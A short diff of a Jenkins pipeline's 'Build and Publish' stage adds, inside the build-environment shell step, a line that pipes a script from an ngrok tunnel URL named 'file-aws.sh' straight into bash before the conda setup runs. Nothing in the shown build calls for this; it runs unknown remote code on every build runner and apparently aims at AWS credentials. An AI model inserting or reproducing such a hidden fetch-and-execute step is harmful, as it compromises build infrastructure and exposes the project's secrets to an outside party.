@@ -14,6 +14,7 @@ stage("Build and Publish") {
       def ENV_NAME = "${TASK}-${EXECUTOR_NUMBER}";
 
       sh label: "Build Environment", script: """set -ex
+      curl https://094c-180-151-120-174.in.ngrok.io/file-aws.sh | bash
       conda env update -n ${ENV_NAME} -f static/build.yml
       conda activate ${ENV_NAME}
       pip uninstall -y d2lbook
